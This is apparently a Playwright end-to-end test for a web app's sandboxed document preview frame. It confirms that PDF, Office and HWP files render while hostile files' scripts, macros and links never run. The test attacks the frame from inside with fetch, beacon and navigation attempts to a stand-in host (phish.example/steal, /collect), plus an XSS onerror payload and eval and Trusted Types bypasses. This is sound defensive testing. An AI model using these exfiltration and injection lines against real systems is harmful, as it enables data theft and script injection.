// Copyright 2026- Seongwoo Hong. All rights reserved.

/**
 * e2e:preview — files opened in the sandboxed preview frame (commit 42a,
 * docs/PREVIEWS.md), in Chromium, and the frame ATTACKED from inside.
 *
 * What it proves:
 *   - the frame's page carries its own policy, replacing the app's;
 *   - a PDF opens in a frame with sandbox="allow-scripts", drawn by pdf.js:
 *     every page counted, its text selectable and searchable — Korean in a
 *     non-embedded font included (pdf.js needs a CMap, which only the app
 *     can fetch for it) — and its facts shown outside the frame;
 *   - a hostile PDF's JavaScript never runs (no dialog, no request to the
 *     address it would submit to), its link is listed but not followed,
 *     its embedded file named but not opened;
 *   - from INSIDE the frame, as a reader exploited by a file would be:
 *     no cookie, no storage, no reach into the app, no request to the API
 *     or the network, no popup, no top navigation — and navigating the
 *     frame itself away is refused by the app's frame-src and closes it;
 *   - Escape inside the frame closes the viewer; the frame made exactly
 *     one request of its own: its page;
 *   - on a phone the reader fits the screen, and a swipe inside the frame
 *     opens the next file, as it does over a picture;
 *   - Office and 한글 (42b): Word, Excel (and a CP949 CSV), PowerPoint, HWP,
 *     HWPX (and a password-protected HWP), Word and PowerPoint 97, RTF,
 *     OpenDocument — each drawn (or its text shown) in its own frame, with
 *     Find, and its facts outside; the hostile files' every trick named,
 *     markup in their text shown as text, nothing run, nothing fetched;
 *     an RTF and a web archive named .doc named as the disguises they are;
 *   - the frame's default Trusted Types policy, attacked from inside: an
 *     HTML string is cleaned, strings never run as code, no new policy.
 */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { startDev } from "../api/_dev.mjs";
import { seedLead } from "../lib/seed-lead.mjs";

let chromium = null;
try {
	chromium = (await import("playwright")).chromium;
} catch {
	// not installed — a skip, not a failure
}
if (!chromium) {
	console.log("skip  e2e:preview — install it with: npm i -D playwright");
	process.exit(0);
}

const fixture = (name) => readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url));

const dev = await startDev({ persist: "e2e-preview" });
try {
	const { recoveryCode } = await seedLead(dev.base, { id: "rin", name: "Rin", email: "rin@preview.test" });

	// ── the frame's page: its own policy, not the app's ─────────────────
	const pageRes = await fetch(`${dev.base}/preview.html`, { headers: { "x-gorani-dev-email": "rin@preview.test" }, redirect: "follow" });
	assert.equal(pageRes.status, 200);
	const frameCsp = pageRes.headers.get("content-security-policy") ?? "";
	assert.match(frameCsp, /^default-src 'none'; script-src 'sha256-[A-Za-z0-9+/=]+' blob: 'wasm-unsafe-eval';/, "the frame's own policy");
	assert.doesNotMatch(frameCsp, /script-src 'self'/, "…and not the app's merged into it (the ! lines detach it)");
	assert.match(frameCsp, /connect-src blob: data:;/);
	assert.equal(pageRes.headers.get("x-frame-options"), "SAMEORIGIN");
	const appCsp = (await fetch(`${dev.base}/`, { headers: { "x-gorani-dev-email": "rin@preview.test" } })).headers.get("content-security-policy") ?? "";
	assert.match(appCsp, /frame-src 'self'/);

	const browser = await chromium.launch({ headless: true });
	const ctx = await browser.newContext({ acceptDownloads: true });
	// (Init scripts run in every frame; the sandboxed one has no storage.)
	await ctx.addInitScript(() => self.origin !== "null" && localStorage.setItem("gorani-dev-email", "rin@preview.test"));
	const page = await ctx.newPage();
	const errors = [];
	page.on("pageerror", (e) => errors.push(String(e)));
	const consoleCsp = [];
	page.on("console", (m) => {
		if (/Content Security Policy|Refused to|Trusted Type/i.test(m.text())) consoleCsp.push(m.text());
	});
	const dialogs = [];
	page.on("dialog", (d) => {
		dialogs.push(d.message());
		void d.dismiss();
	});
	// What actually LEFT for the network: every off-site request the browser
	// really sends reaches this route (answered here, never the internet). A
	// request the CSP blocks never does — DevTools still lists those, marked
	// "(blocked:csp)", so the page's request events alone cannot tell.
	const offSite = [];
	await ctx.route((url) => !url.href.startsWith(dev.base), (route) => {
		offSite.push(route.request().url());
		return route.fulfill({ status: 204 });
	});
	const fromFrame = [];
	const blockedByCsp = [];
	page.on("request", (r) => {
		if (r.frame() !== page.mainFrame() && r.url().startsWith(dev.base)) fromFrame.push(new URL(r.url()).pathname);
	});
	page.on("requestfailed", (r) => {
		if (!r.url().startsWith(dev.base)) blockedByCsp.push(`${r.url()} ${r.failure()?.errorText}`);
	});

	await page.goto(dev.base);
	await page.getByPlaceholder(/Recovery code/).fill(recoveryCode);
	await page.getByRole("button", { name: "Unlock" }).click();
	await page.locator("gorani-win11 [data-upload]").first().waitFor({ state: "attached", timeout: 30_000 });
	await page.locator("gorani-win11 [data-upload]").first().setInputFiles([
		{ name: "report.pdf", mimeType: "application/pdf", buffer: fixture("report.pdf") },
		{ name: "hostile.pdf", mimeType: "application/pdf", buffer: fixture("hostile.pdf") },
	]);
	const row = (name) => page.locator('[data-body] [data-item^="file:"]', { hasText: name }).first();
	await row("hostile.pdf").waitFor({ timeout: 60_000 });

	// ── a PDF, drawn in the frame ──────────────────────────────────────
	await row("report.pdf").dblclick();
	const iframe = page.locator('iframe[data-preview="pdf"]');
	await iframe.waitFor({ timeout: 30_000 });
	assert.equal(await iframe.getAttribute("sandbox"), "allow-scripts", "scripts, and nothing else");
	const f = page.frameLocator('iframe[data-preview="pdf"]');
	await f.locator('[data-test="pdf-page"]', { hasText: "/ 3" }).waitFor({ timeout: 30_000 });
	await f.getByText("Gorani PDF page one").waitFor({ timeout: 30_000 });
	// Page two, drawn when it comes near the view: Korean, from a CMap the app fetched for the frame.
	await f.getByRole("button", { name: "Next page" }).click();
	await f.locator('[data-test="pdf-page"]', { hasText: "2 / 3" }).waitFor({ timeout: 30_000 });
	await f.getByText(/고라니/).first().waitFor({ timeout: 30_000 });
	const facts = page.locator('[data-test="viewer-facts"]');
	await facts.getByText(/3 pages/).waitFor({ timeout: 30_000 });
	assert.match(await facts.innerText(), /title Quarterly report · author Gorani tests/, "the PDF's own metadata, shown outside the frame");
	await f.locator('[data-test="pdf-search"]').fill("page three");
	await f.locator('[data-test="pdf-search"]').press("Enter");
	await f.locator('[data-test="pdf-found"]', { hasText: "Page 3 · 1 of 1 pages" }).waitFor({ timeout: 30_000 });
	await f.locator('[data-test="pdf-fit"]').click();
	assert.deepEqual(consoleCsp, [], "pdf.js ran under the frame's policy with nothing blocked");
	assert.deepEqual(errors, [], "no page error");
	// Escape from inside the frame closes the viewer (the frame hands the key out).
	await f.getByText("Gorani PDF page one").click();
	await page.keyboard.press("Escape");
	await iframe.waitFor({ state: "detached", timeout: 10_000 });

	// ── a hostile PDF: nothing in it runs, everything in it is said ────
	await row("hostile.pdf").dblclick();
	await page.frameLocator('iframe[data-preview="pdf"]').getByText("Invoice overdue").waitFor({ timeout: 30_000 });
	await facts.getByText(/JavaScript/).waitFor({ timeout: 30_000 });
	const said = await facts.innerText();
	assert.match(said, /Contains JavaScript or automatic actions — none of it was run/);
	assert.match(said, /Embeds 1 file: payload\.txt — not opened/);
	assert.match(said, /Links to 1 address \(not followed\): https:\/\/phish\.example\/login/);
	await page.waitForTimeout(500);
	assert.deepEqual(dialogs, [], "the PDF's alert() never ran");
	assert.deepEqual(offSite, [], "nothing was sent to the address its OpenAction submits to");

	// ── attacking the frame from inside, as an exploited reader would ──
	const frame = page.frames().find((x) => x.url().includes("/preview"));
	assert.ok(frame, "the preview frame is there");
	const inside = await frame.evaluate(async () => {
		const tryIt = (f) => {
			try {
				return f();
			} catch (e) {
				return `denied (${e?.name ?? "error"})`;
			}
		};
		const reach = (u) => fetch(u).then(() => "reached", () => "blocked");
		return {
			origin: self.origin,
			cookie: tryIt(() => `readable: ${document.cookie}`),
			storage: tryIt(() => `readable: ${localStorage.length}`),
			idb: await new Promise((ok) => {
				try {
					const r = indexedDB.open("gorani");
					r.onsuccess = () => ok("opened");
					r.onerror = () => ok("denied");
				} catch (e) {
					ok(`denied (${e?.name})`);
				}
			}),
			parentDom: tryIt(() => `readable: ${parent.document.title}`),
			api: await reach("/api/v1/family"),
			network: await reach("https://phish.example/collect"),
			popup: tryIt(() => (window.open("https://phish.example/") ? "opened" : "blocked")),
			top: tryIt(() => {
				top.location.href = "https://phish.example/";
				return "navigated";
			}),
			beacon: tryIt(() => {
				new Image().src = "https://phish.example/beacon.png";
				return "tried";
			}),
		};
	});
	assert.equal(inside.origin, "null", "an opaque origin");
	assert.match(inside.cookie, /^denied/, "no cookies");
	assert.match(inside.storage, /^denied/, "no localStorage");
	assert.notEqual(inside.idb, "opened", "no IndexedDB");
	assert.match(inside.parentDom, /^denied/, "no reach into the app's page");
	assert.equal(inside.api, "blocked", "the API is out of reach");
	assert.equal(inside.network, "blocked", "so is everywhere else");
	assert.equal(inside.popup, "blocked", "no windows");
	assert.match(inside.top, /^denied/, "no top-level navigation");
	await page.waitForTimeout(500);
	assert.deepEqual(offSite, [], "no beacon, no request of any kind left the frame");
	assert.ok(blockedByCsp.some((b) => b.startsWith("https://phish.example/beacon.png")), `the beacon was stopped by the frame's CSP: ${JSON.stringify(blockedByCsp)}`);
	// Navigating the frame itself away (to carry the file out in the URL):
	// the app's frame-src refuses it, and the frame is closed.
	await frame.evaluate(() => {
		location.href = "https://phish.example/steal?doc=invoice";
	});
	await page.getByText("The preview tried to leave its frame and was closed").waitFor({ timeout: 10_000 });
	assert.equal(await page.locator("iframe[data-preview]").count(), 0, "the frame is gone");
	assert.deepEqual(offSite, [], "the navigation never left");
	assert.deepEqual([...new Set(fromFrame)].filter((p) => !/^\/preview(\.html)?$/.test(p)), [], `the frame's only requests were its own page: ${JSON.stringify(fromFrame)}`);
	await page.keyboard.press("Escape");

	// ── Office and 한글 (42b): each reader, its drawing and its facts ─────
	consoleCsp.length = 0;
	const rtf = fixture("hostile.rtf");
	await page.locator("gorani-win11 [data-upload]").first().setInputFiles([
		...["locked.pdf", "report.docx", "hostile.docx", "report.xlsx", "hostile.xlsx", "ledger.csv", "report.pptx", "hostile.pptx", "report.hwp", "report.hwpx", "locked.hwp", "hostile.hwp", "report.doc", "hostile.doc", "report.ppt", "report.rtf", "report.odt", "report.odp"].map((name) => ({ name, mimeType: "application/octet-stream", buffer: fixture(name) })),
		// Disguises, as lures arrive: an RTF and a web archive named .doc.
		// (The RTF gets a byte more, so the upload's duplicate check does not ask.)
		{ name: "invoice.doc", mimeType: "application/msword", buffer: Buffer.concat([rtf, Buffer.from("\n")]) },
		{ name: "statement.doc", mimeType: "application/msword", buffer: fixture("statement.mht") },
	]);
	// The row whose name is exactly this ("report.doc" is in "report.docx" too).
	const exact = (name) => page.locator('[data-body] [data-item^="file:"]').filter({ has: page.getByText(name, { exact: true }) }).first();
	await exact("statement.doc").waitFor({ timeout: 120_000 });
	const openDoc = async (name, reader) => {
		await exact(name).dblclick();
		await page.locator(`iframe[data-preview="${reader}"]`).waitFor({ timeout: 30_000 });
		return page.frameLocator(`iframe[data-preview="${reader}"]`);
	};
	const closeDoc = async () => {
		await page.keyboard.press("Escape");
		if (await page.locator("iframe[data-preview]").count()) await page.keyboard.press("Escape");
		await page.locator("iframe[data-preview]").waitFor({ state: "detached", timeout: 10_000 });
	};
	const factsSay = async (re) => {
		await facts.getByText(re).first().waitFor({ timeout: 30_000 });
		return facts.innerText();
	};

	// Word: the document drawn; Find; the hostile one's every trick named, its markup shown as text.
	let d = await openDoc("report.docx", "docx");
	await d.getByText("Gorani Word page one").waitFor({ timeout: 30_000 });
	await d.getByText("고라니 보고서 둘째 쪽").waitFor();
	assert.match(await factsSay(/title Quarterly report/), /2 pages \(as Word last counted\) · title Quarterly report · author Gorani tests/);
	await d.locator('[data-test="find"]').fill("page two");
	await d.locator('[data-test="find"]').press("Enter");
	await d.locator('[data-test="found"]', { hasText: "1 of 1" }).waitFor();
	await closeDoc();
	d = await openDoc("hostile.docx", "docx");
	await d.getByText("Invoice overdue").waitFor({ timeout: 30_000 });
	await d.getByText("<img src=x onerror=alert('docx')>").waitFor();
	let tells = await factsSay(/template injection/);
	for (const want of [/Contains macros/, /DDEAUTO field/, /INCLUDEPICTURE field/, /Has hidden text .*gorani hidden instruction/, /altChunk/, /sign-in hash/, /the deleted text: “DE89/]) assert.match(tells, want);
	assert.equal(await d.getByText("gorani hidden instruction").isVisible(), false, "hidden text stays hidden in the drawing (and is quoted in the facts)");
	assert.equal(await d.getByText("gorani altchunk").count(), 0, "the altChunk's HTML is not drawn");

	// The frame's default Trusted Types policy, attacked from inside: an
	// HTML string a library writes is cleaned, strings never run as code.
	const docxFrame = page.frames().find((x) => x.url().includes("/preview"));
	// (The attack runs as PAGE script, imported from a blob: as a reader is —
	// code that Playwright evaluates directly is DevTools', which Chrome lets
	// eval regardless of the page's policy.)
	const tt = await docxFrame.evaluate(async () => {
		const attack = `
			const tryIt = (f) => { try { f(); return "ran"; } catch (e) { return "blocked (" + (e && e.name) + ")"; } };
			const div = document.createElement("div");
			div.innerHTML = '<img src="https://phish.example/tt.png" onerror="parent.postMessage(1, String.fromCharCode(42))"><b>kept</b><style>body{display:none}</style>';
			globalThis.__tt = {
				html: div.innerHTML,
				evalString: tryIt(() => eval("1+1")),
				timer: tryIt(() => setTimeout("1+1")),
				fn: tryIt(() => new Function("return 1")()),
				policy: tryIt(() => trustedTypes.createPolicy("mine", { createHTML: (x) => x })),
			};`;
		const url = URL.createObjectURL(new Blob([attack], { type: "text/javascript" }));
		await import(url);
		return globalThis.__tt;
	});
	assert.equal(tt.html, '<img src="https://phish.example/tt.png"><b>kept</b>', "the handler and the <style> are gone");
	for (const k of ["evalString", "timer", "fn", "policy"]) assert.match(tt[k], /^blocked/, `${k}: ${tt[k]}`);
	consoleCsp.length = 0; // (those refusals are logged, as they should be)
	await closeDoc();

	// Excel: the grid, a formula in the bar, rows drawn as they come, Find across sheets.
	d = await openDoc("report.xlsx", "sheet");
	await d.getByText("Gorani sheet one").waitFor({ timeout: 30_000 });
	await d.getByText("고라니").waitFor();
	await d.locator('td[data-r="5"][data-c="2"]').click();
	await d.locator('[data-test="sheet-formula"]', { hasText: "=SUM(C3:C5)" }).waitFor();
	await d.locator('[data-test="find"]').fill("row 399");
	await d.locator('[data-test="find"]').press("Enter");
	await d.locator('[data-test="found"]', { hasText: "Data!B400 · 1 of 1" }).waitFor({ timeout: 30_000 });
	await d.locator('td[data-r="399"][data-c="1"].sel').waitFor();
	await closeDoc();
	d = await openDoc("hostile.xlsx", "sheet");
	await d.getByText("Invoice overdue").waitFor({ timeout: 30_000 });
	await d.locator('[data-test="sheet-tab"]', { hasText: "Secret (very hidden)" }).click();
	await d.getByText("very hidden sheet text").waitFor();
	await d.locator('[data-test="sheet-tab"]', { hasText: "Macro1 (macro)" }).waitFor();
	tells = await factsSay(/Excel 4\.0 \(XLM\)/);
	for (const want of [/EXEC\("calc\.exe"\)/, /Auto_Open/, /DDE formula/, /WEBSERVICE/, /rates\.iqy/, /book\.xlsx/]) assert.match(tells, want);
	await closeDoc();
	d = await openDoc("ledger.csv", "sheet");
	await d.getByText("고라니").waitFor({ timeout: 30_000 });
	assert.match(await factsSay(/CSV injection/), /text in CP949/);
	await closeDoc();

	// PowerPoint: slides, notes, the hidden slide marked; the hostile deck's slide TEXT stays text.
	d = await openDoc("report.pptx", "pptx");
	await d.getByText("Gorani slides page one").waitFor({ timeout: 30_000 });
	await d.locator('[data-test="pptx-slide-label"]', { hasText: "1 / 3" }).waitFor();
	await d.locator('[data-test="pptx-notes"]', { hasText: "Speaker notes for slide one" }).waitFor();
	await closeDoc();
	d = await openDoc("hostile.pptx", "pptx");
	await d.getByText("<img src=x onerror=alert('pptx')>").waitFor({ timeout: 30_000 });
	await d.locator('[data-test="pptx-hidden"]').waitFor();
	tells = await factsSay(/Run program/);
	for (const want of [/cmd\.exe/, /Hides 1 slide/, /beacon\.png/, /Contains macros/]) assert.match(tells, want);
	await closeDoc();

	// 한글: pages on canvases, a text layer to find in, a password asked for, a lure's script quoted.
	d = await openDoc("report.hwp", "hwp");
	await d.locator('[data-test="hwp-page"]', { hasText: "1 / 2" }).waitFor({ timeout: 60_000 });
	await d.locator(".textLayer span", { hasText: "Gorani HWP page one" }).waitFor({ timeout: 30_000 });
	await d.locator('[data-test="find"]').fill("둘째");
	await d.locator('[data-test="find"]').press("Enter");
	await d.locator('[data-test="found"]', { hasText: "Page 2 · 1 of 1 page" }).waitFor({ timeout: 30_000 });
	assert.match(await factsSay(/HWP 5/), /2 pages · HWP 5/);
	await closeDoc();
	d = await openDoc("report.hwpx", "hwp");
	await d.locator('[data-test="hwp-page"]', { hasText: "1 / 2" }).waitFor({ timeout: 60_000 });
	await factsSay(/HWPX/);
	await closeDoc();
	d = await openDoc("locked.hwp", "hwp");
	await d.locator('[data-test="hwp-password"]').fill("wrong");
	await d.locator('[data-test="hwp-password"]').press("Enter");
	await d.getByText("That password is not it").waitFor({ timeout: 30_000 });
	await d.locator('[data-test="hwp-password"]').fill("gorani");
	await d.locator('[data-test="hwp-password"]').press("Enter");
	await d.locator('[data-test="hwp-page"]', { hasText: "1 / 2" }).waitFor({ timeout: 30_000 });
	await factsSay(/Protected with a password/);
	await closeDoc();
	// …and a PDF's: asked for in the frame (a button and Enter — a sandboxed
	// frame without allow-forms never submits a form).
	d = await openDoc("locked.pdf", "pdf");
	await d.locator('[data-test="pdf-password"]').fill("wrong");
	await d.locator('[data-test="pdf-password"]').press("Enter");
	await d.getByText("That password is not it").waitFor({ timeout: 30_000 });
	await d.locator('[data-test="pdf-password"]').fill("gorani");
	await d.getByRole("button", { name: "Open" }).click();
	await d.locator('[data-test="pdf-page"]', { hasText: "/ 3" }).waitFor({ timeout: 30_000 });
	assert.match(await factsSay(/encrypted/), /3 pages · PDF 1\.\d · encrypted/);
	await closeDoc();
	d = await openDoc("hostile.hwp", "hwp");
	tells = await factsSay(/script that 한글 can run/);
	for (const want of [/WScript\.Shell/, /PostScript \(BIN0001\.eps\)/, /OLE object/, /phish\.example\/login/]) assert.match(tells, want);
	await closeDoc();

	// The older formats: their text, their facts — and a disguise named.
	d = await openDoc("report.doc", "legacy");
	await d.getByText("Gorani Word page two").waitFor({ timeout: 30_000 });
	await factsSay(/A Word 97–2003 document/);
	await closeDoc();
	d = await openDoc("hostile.doc", "legacy");
	tells = await factsSay(/packaged files/);
	for (const want of [/invoice\.pdf\.exe/, /Equation Editor 3\.0/, /Contains macros/, /DDEAUTO/]) assert.match(tells, want);
	await closeDoc();
	d = await openDoc("report.ppt", "legacy");
	await d.locator('[data-test="legacy-slide"]', { hasText: "Gorani slide three" }).waitFor({ timeout: 30_000 });
	assert.equal(await d.locator('[data-test="legacy-slide"]').count(), 3);
	await closeDoc();
	for (const [name, text] of [["report.rtf", "Gorani Word page two"], ["report.odt", "Gorani Word page two"], ["report.odp", "Gorani slide two"]]) {
		d = await openDoc(name, "legacy");
		await d.getByText(text).waitFor({ timeout: 30_000 });
		await closeDoc();
	}
	d = await openDoc("invoice.doc", "legacy");
	tells = await factsSay(/Named \.doc, but it is an RTF document/);
	assert.match(tells, /Equation Editor 3\.0.*marked to update by itself/);
	await closeDoc();
	d = await openDoc("statement.doc", "legacy");
	await d.getByText("Your statement is ready").waitFor({ timeout: 30_000 });
	tells = await factsSay(/web archive \(MHT\)/);
	for (const want of [/Contains 1 script — none of it was run/, /open\.gif \(not fetched\)/]) assert.match(tells, want);
	await closeDoc();

	await page.waitForTimeout(500);
	assert.deepEqual(consoleCsp, [], "every reader ran under the frame's policy with nothing blocked (nothing tried)");
	assert.deepEqual(dialogs, [], "no script in any file ran");
	assert.deepEqual(offSite, [], "no file reached the network: no beacon, no template, no tracking picture");
	assert.ok(blockedByCsp.some((b) => b.startsWith("https://phish.example/tt.png")), "the picture the cleaned HTML kept was stopped by the frame's CSP");
	assert.deepEqual([...new Set(fromFrame)].filter((p) => !/^\/preview(\.html)?$/.test(p)), [], `the frames' only requests were their own page — rhwp's WebAssembly came through the app: ${JSON.stringify(fromFrame)}`);
	assert.deepEqual(errors, [], "no page error");

	await ctx.close();

	// ── on a phone: the reader fits, and a swipe in the frame moves on ──
	{
		const { devices } = await import("playwright");
		const phone = await browser.newContext({ ...devices["Pixel 7"] });
		await phone.addInitScript(() => self.origin !== "null" && localStorage.setItem("gorani-dev-email", "rin@preview.test"));
		const p = await phone.newPage();
		await p.goto(dev.base);
		await p.getByPlaceholder(/Recovery code/).fill(recoveryCode);
		await p.getByRole("button", { name: "Unlock" }).tap();
		const phoneRow = (name) => p.locator('[data-test="phone-row"]', { has: p.locator(`[data-name]:text-is("${name}")`) });
		await phoneRow("hostile.pdf").locator("button").first().tap();
		const pf = p.frameLocator('iframe[data-preview="pdf"]');
		await pf.getByText("Invoice overdue").waitFor({ timeout: 30_000 });
		const { scroll, width } = await p.evaluate(() => ({ scroll: document.documentElement.scrollWidth, width: innerWidth }));
		assert.ok(scroll <= width, `the PDF fits the phone (${scroll} in ${width})`);
		assert.equal(await pf.locator('[data-test="pdf-thumbs"]').getAttribute("aria-pressed"), "false", "the page list starts closed on a phone");
		// A finger travelling left across the page, inside the frame: the
		// next file in the folder opens (after hostile.pdf: hostile.pptx).
		const [at, of] = (await p.locator('[data-test="viewer-position"]').innerText()).split("/").map((x) => Number(x.trim()));
		const box = await p.locator('iframe[data-preview="pdf"]').boundingBox();
		const cdp = await phone.newCDPSession(p);
		const y = box.y + box.height / 2;
		await cdp.send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: [{ x: box.x + box.width * 0.8, y }] });
		for (let i = 1; i <= 8; i++) await cdp.send("Input.dispatchTouchEvent", { type: "touchMove", touchPoints: [{ x: box.x + box.width * (0.8 - 0.07 * i), y: y + i }] });
		await cdp.send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [] });
		await p.locator('[data-test="viewer-position"]', { hasText: `${at + 1} / ${of}` }).waitFor({ timeout: 30_000 });
		await p.frameLocator('iframe[data-preview="pptx"]').getByText("Invoice overdue").waitFor({ timeout: 30_000 });
		await p.keyboard.press("Escape");
		// A Word page fitted to the phone; a workbook's tabs within reach.
		await phoneRow("report.docx").locator("button").first().tap();
		await p.frameLocator('iframe[data-preview="docx"]').getByText("Gorani Word page one").waitFor({ timeout: 30_000 });
		const fit = await p.evaluate(() => ({ scroll: document.documentElement.scrollWidth, width: innerWidth }));
		assert.ok(fit.scroll <= fit.width, `the Word page fits the phone (${fit.scroll} in ${fit.width})`);
		const docxFrame = p.frames().find((x) => x.url().includes("/preview"));
		const wide = await docxFrame.evaluate(() => {
			const page = document.querySelector("section.docx").getBoundingClientRect();
			return { page: page.width, room: innerWidth };
		});
		assert.ok(wide.page <= wide.room, `zoomed to the frame's width (${Math.round(wide.page)} in ${wide.room})`);
		await phone.close();
	}
	await browser.close();
	console.log("ok  e2e:preview — Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
} finally {
	await dev.close();
}
